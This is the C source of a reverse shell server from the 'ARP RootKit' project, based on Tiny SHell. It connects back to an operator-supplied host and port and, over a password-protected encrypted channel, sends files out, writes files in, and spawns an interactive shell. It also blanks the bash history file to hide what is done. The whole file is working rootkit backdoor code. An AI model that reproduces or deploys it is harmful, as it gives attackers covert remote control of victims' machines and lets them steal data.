/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <pty.h>

#include "rshell.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

char workmode = 0;

/* function declaration */
int process_client(int client);
int send_file(int client);
int recv_file(int client);
int run_cmd(int client);

/* program entry point */
int main(int argc, char **argv) {
    int ret = 0, client = 0; //, opt = 0;
    socklen_t n = 0;
    struct sockaddr_in client_addr;
    struct hostent *client_host = NULL;
	const char *cb_host = NULL;
	unsigned short client_port = 0;

	memset(&client_addr, 0, sizeof(client_addr));

	/*
    while ((opt = getopt(argc, argv, "s:p:c::")) != -1) {
        switch (opt) {
            case 'p':
                server_port=atoi(optarg);
                if (!server_port) usage(*argv);
                break;
            case 's':
                secret=optarg;
                break;
			case 'c':
				if (optarg == NULL) {
					cb_host = CONNECT_BACK_HOST;
				} else {
					cb_host = optarg;
				}
				break;
            default:
                usage(*argv);
                break;
        }
    }
	*/

	if (argc < 3) {
		return -1;
	}

    cb_host = argv[1];
    client_port = atoi(argv[2]);
	if (!cb_host || !client_port) {
		return -1;
	}

    /* fork into background */
/*
    pid = fork();
    if (pid < 0) {
        return -1;
    }

    if (pid != 0) {
        return 0;
    }
*/
    /* create a new session */
/*
    if (setsid() < 0) {
        perror("socket");
        return -1;
    }
*/
    /* close all file descriptors */
    for (n = 0; n < 1024; n++) {
        close(n);
    }

	/* connect back mode */
	sleep(2);

	/* create a socket */
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0) {
		return -1;
	}

	/* resolve the client hostname */
	client_host = gethostbyname(cb_host);
	if (client_host == NULL) {
		return -1;
	}

	memcpy((void *) &client_addr.sin_addr, (void *) client_host->h_addr, client_host->h_length);
	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(client_port);

	/* try to connect back to the client */
	ret = connect(client, (struct sockaddr *) &client_addr, sizeof(client_addr));
	if (ret < 0) {
		close(client);
		return -1;
	}

	ret = process_client(client);
	if (ret < 0) {
		return -1;
	}

	return 0;
}

int process_client(int client) {
	int ret, len;

    /* fork a child to handle the connection */
    /*
	pid = fork();
    if (pid < 0) {
        close(client);
        return -1;
    }

    if (pid != 0) {
		waitpid(pid, NULL, 0);
        close(client);
    	return 0;
    }
	*/
    /* the child forks and then exits so that the grand-child's
     * father becomes init (this to avoid becoming a zombie) */
	/*
    pid = fork();
    if (pid < 0) {
        return -1;
    }
    if (pid != 0) {
    	return 0;
    }
	*/
    /* setup the packet encryption layer */
    alarm(3);
    ret = pel_server_init(client, RSHELL_PASSWORD);
    if (ret != PEL_SUCCESS) {
		close(client);
    	return -1;
    }
    alarm(0);

    /* get the action requested by the client */
    ret = pel_recv_msg(client, message, &len);
    if(ret != PEL_SUCCESS || len != 1) {
        close(client);
        return -1;
    }

    /* howdy */
	workmode = message[0];
	switch (message[0]) {
        case 'd':
            ret = send_file(client);
            break;

        case 'u':
            ret = recv_file(client);
            break;

		case 's':
        case 'c':
			ret = run_cmd(client);
			break;

        default:
        	ret = -1;
	    	break;
    }

    close(client);

	return ret;
}

int send_file(int client) {
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg(client, message, &len);
    if (ret != PEL_SUCCESS) {
        return -1;
    }

    message[len] = '\0';

    /* open local file */
    fd = open((char *) message, O_RDONLY);
    if (fd < 0) {
        return -1;
    }

    /* send the data */
    while (1) {
        len = read(fd, message, BUFSIZE);
        if (len == 0) {
			break;
		}
        if (len < 0) {
            return -1;
        }

        ret = pel_send_msg(client, message, len);
        if(ret != PEL_SUCCESS) {
            return -1;
        }
    }

    return 0;
}

int recv_file(int client) {
    int ret, len, fd;

    /* get the filename */
    ret = pel_recv_msg(client, message, &len);
    if (ret != PEL_SUCCESS) {
        return -1;
    }
    message[len] = '\0';

    /* create local file */
    fd = creat((char *) message, 0644);
    if (fd < 0) {
        return -1;
    }

    /* fetch the data */
    while (1) {
        ret = pel_recv_msg(client, message, &len);

        if (ret != PEL_SUCCESS) {
            if (pel_errno == PEL_CONN_CLOSED) {
                break;
            }

            return -1;
        }

        if (write(fd, message, len) != len) {
            return -1;
        }
    }

    return 0;
}

int run_cmd(int client) {
    fd_set rd;
    struct winsize ws;
    char *slave = NULL, *temp = NULL;
    int ret = 0, len = 0, pid = 0, pty = 0, tty = 0, n = 0;

	memset(&ws, 0, sizeof(ws));

    /* request a pseudo-terminal */
    if (openpty(&pty, &tty, NULL, NULL, NULL ) < 0) {
        return -1;
    }

    slave = ttyname(tty);
    if (slave == NULL) {
        return -1;
    }

    /* just in case bash is run, kill the history file */
    temp = (char *) malloc(10);
    if (temp == NULL) {
        return -1;
    }

	/* set static env */
	putenv("PWD=/tmp");
	putenv("HISTFILE=\0");
	putenv("PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# ");
    putenv("HOME=" ARPRK_HOME);
	putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" ARPRK_HOME ":" ARPRK_HOME "/bin");

    /* get the TERM environment variable */
    ret = pel_recv_msg(client, message, &len);
    if (ret != PEL_SUCCESS) {
        return -1;
    }
    message[len] = '\0';
    temp = (char *) malloc(len + 6);
    if (temp == NULL) {
        return -1;
    }
    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';
    strncpy(temp + 5, (char *) message, len + 1);
    putenv(temp);

    /* get the window size */
    ret = pel_recv_msg(client, message, &len);
    if (ret != PEL_SUCCESS || len != 4 ) {
        return -1;
    }
    ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
    ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;
    if (ioctl(pty, TIOCSWINSZ, &ws ) < 0) {
        return -1;
    }

    /* get the system command */
    ret = pel_recv_msg(client, message, &len);
    if (ret != PEL_SUCCESS) {
        return -1;
    }
    message[len] = '\0';
    temp = (char *) malloc(len + 1);
    if (temp == NULL) {
        return -1;
    }

    strncpy(temp, (char *) message, len + 1);

    /* fork to spawn a shell */
	pid = fork();

    if (pid < 0) {
        return -1;
    }

    if (pid == 0) {
        /* close the client socket and the pty (master side) */
        close(client);
        close(pty);

        /* create a new session */
        if (setsid() < 0) {
            return -1;
        }

        /* set controlling tty, to have job control */
        if (ioctl(tty, TIOCSCTTY, NULL ) < 0) {
            return -1;
        }

        /* tty becomes stdin, stdout, stderr */
        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);

        if (tty > 2) {
            close(tty);
        }

	    execl("/bin/sh", "sh", "-c", temp, NULL);

        /* d0h, this shouldn't happen */
        return -1;
    } else {
        /* tty (slave side) not needed anymore */
        close(tty);

        /* let's forward the data back and forth */
        while (1) {
            FD_ZERO(&rd);
            FD_SET(client, &rd);
            FD_SET(pty, &rd);

            n = (pty > client) ? pty : client;

            if (select(n + 1, &rd, NULL, NULL, NULL) < 0) {
                return -1;
            }

            if (FD_ISSET(client, &rd)) {
                ret = pel_recv_msg(client, message, &len);
                if (ret != PEL_SUCCESS) {
                    return -1;
                }

                if (write(pty, message, len) != len) {
                    return -1;
                }
            }

            if (FD_ISSET(pty, &rd)) {
                len = read(pty, message, BUFSIZE);
                if (len == 0) {
					break;
				}

                if (len < 0) {
                    return -1;
                }

                ret = pel_send_msg(client, message, len);
                if (ret != PEL_SUCCESS) {
                    return -1;
                }
            }
        }

        return -1;
    }

    /* not reached */
    return -1;
}
